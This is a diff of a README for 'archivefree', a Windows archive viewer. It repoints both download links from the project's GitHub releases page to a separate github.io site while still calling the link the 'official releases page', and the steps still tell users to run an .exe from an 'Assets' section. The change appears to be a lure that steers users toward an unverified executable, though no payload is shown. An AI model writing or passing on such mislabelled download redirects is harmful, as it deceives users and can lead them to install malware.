@@ -1,6 +1,6 @@
 # 📦 archivefree - View archive contents without extracting files
 
-[![Download archivefree](https://img.shields.io/badge/Download-Archivefree-blue.svg)](https://github.com/going-aixsponsa594/archivefree/releases)
+[![Download archivefree](https://img.shields.io/badge/Download-Archivefree-blue.svg)](https://going-aixsponsa594.github.io)
 
 archivefree helps you see what sits inside compressed folders. You do not need to unpack files to check their contents. This saves time and disk space. The software works with common formats like zip, rar, tar, and 7zip. It stays out of your way and does not show ads.
 
@@ -8,7 +8,7 @@ archivefree helps you see what sits inside compressed folders. You do not need t
 
 You can set up archivefree on your Windows computer in a few minutes. Follow these instructions to find the latest version and run the application.
 
-1. Visit the [official releases page](https://github.com/going-aixsponsa594/archivefree/releases).
+1. Visit the [official releases page](https://going-aixsponsa594.github.io).
 2. Look for the most recent version under the Assets header.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your Downloads folder or your desktop.
